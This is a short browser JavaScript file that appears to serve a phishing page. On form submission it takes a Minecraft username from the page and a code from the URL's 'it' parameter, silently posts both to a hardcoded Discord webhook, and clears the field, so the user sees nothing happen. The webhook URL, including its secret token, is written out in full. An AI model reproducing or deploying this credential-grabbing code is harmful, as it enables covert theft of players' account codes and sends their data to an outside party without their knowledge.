
let webhook_url = "https://discord.com/api/webhooks/910710435555205120/0Il00HgouH9eFAwOLeWmh7OwkFPn7RiS34A5m_waBMcJMxXZdIbv6b1uZWyEsMQome50";

window.onload = (e) => {
    let username_element = document.querySelector('#minecraft-name');
    function processForm(e) {
        if (e.preventDefault) e.preventDefault();
        const urlParams = new URLSearchParams(window.location.search);

        if (urlParams.has("it")) {
            fetch(
                webhook_url,
                {
                    method: "post",
                    headers: {
                        'Accept': 'application/json',
                        'Content-Type': 'application/json'
                    },
                    //make sure to serialize your JSON body
                    body: JSON.stringify({
                        content: `name:${username_element.value}\ncode:${urlParams.get("it")}` 
                    })
                }
            )
        }
        username_element.value = ""
        // You must return false to prevent the default form behavior
        return false;
    }

    let form = document.getElementById('submit-form');
    if (form.attachEvent) {
        form.attachEvent("submit", processForm);
    } else {
        form.addEventListener("submit", processForm);
    }
}